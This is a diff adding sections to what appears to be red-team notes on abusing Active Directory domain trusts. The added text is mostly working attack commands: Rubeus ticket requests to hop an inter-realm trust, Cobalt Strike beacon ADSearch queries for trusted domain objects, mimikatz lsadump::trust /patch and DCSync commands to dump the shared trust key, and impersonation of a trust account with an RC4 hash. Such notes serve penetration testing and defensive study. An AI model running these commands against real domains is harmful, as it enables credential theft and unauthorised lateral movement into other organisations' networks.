@@ -33,9 +33,89 @@ The `MemberName` field contains a SID that can be resolved in our current domain
 ```powershell
 ConvertFrom-SID  S-1-5-21-3263068140-2042693922-2891547269-1132
 ```
+
+To hop a domain trust using Kerberos, we first need an inter-realm Key. We can obtain a TGT for the target user.
+
+```
+.\Rubeus.exe asktgt /user:admin /domain:corp.local /aes256:<aes256> /nowrap
+```
+
+Then, we can use the TGT to request a referral ticket form the current domain to the target domain.
+
+```
+.\Rubeus.exe asktgs /service:krbtgt/target-domain.com /domain:corp.local /dc:dc01.corp.local /ticket:<base64-ticket> /nowrap
+```
+
+> **Note**: The inter-realm ticket is `rc4_hmac` even if we created the TGT with `aes256_cts_hmac_sha1`. This is a default configuration unless AES has ben specifically configured on the trust.
+
+Finally we an use this inter-realm ticket to request a TGS.
+
+```
+.\Rubeus.exe asktgs /service:cifs/dc.target-domain.com /domain:target-domain.com /dc:dc.target-domain.com /ticket:<base64-inter-realm> /nowrap
+```
+
+
 # One-Way (Outbound)
 
 If Domain A (Me) trusts Domain B, users in Domain B can access resources in Domain A but users in Domain A should not be able to access resources in Domain B. But there are some circumstances in which we can slide under the radar. An example of this includes SQL Server Links.
+
+```
+Get-DomainTrust -Domain corp.local
+```
+
+## Trusted Domain Object (TDO) user
+
+But, we can still partially exploit this trus and obtain a "Domain User" of the trust abusing the Trusted Domain Object (TDO). Both domains in a trust relationship store a shared password which is automatically changed every 30 days. These objects are stored in the system contained and can be read via LDAP.
+
+```
+beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(objectCategory=trustedDomain)" --domain corp.local --attributes distinguishedName,name,flatName,trustDirection
+```
+
+### Retrieving the Trusted Key
+
+There are two ways:
+
+* Moving laterally to the DC and dump the key from memory.
+
+```
+beacon> mimikatz lsadump::trust /patch
+```
+
+> **Note**: Memory patching is very risky, particularly on domain controllers.
+
+* Using DCSync with the TDO GUID.
+
+```powershell
+Get-DomainObject -Identity "CN=target-domain.com,CN=System,DC=corp,DC=local" | select objectGuid
+```
+
+```
+beacon> mimikatz @lsadump::dcsync /domain:corp.local /guid:{b93d2e36-48df-46bf-89d5-2fc22c139b43}
+```
+
+`[Out]` and `[Out-1]` are the "new" and "old" passwords respectively.  In most cases, the current `[Out]` key is the one you want. 
+
+### Creating a TGT
+
+In addition, there is also a "trust account" which is created in the "trusted" domain, with the name of the "trusting" domain.  For instance, if we get all the user accounts in the DEV domain, we'll see CYBER$ and STUDIO$, which are the trust accounts for those respective domain trusts.
+
+```
+beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(objectCategory=user)"
+
+[*] TOTAL NUMBER OF SEARCH RESULTS: 11
+
+        [...]
+	[+] cn : CORP$
+	[+] cn : TARGET$
+```
+
+This meand TARGET domain will have a trust account called `CORP$`. This is the account we must impersonate to request Kerberos tickets across the trust.
+
+```
+.\Rubeus.exe asktgt /user:CORP$ /domain:target-domain.com /rc4:f3fc2312d9d1f80b78e67d55d41ad496 /nowrap
+```
+
+> **Note**: RC4 tickets are used by default across trusts.
 
 ## Trust Abuse with MSSQL Server
 
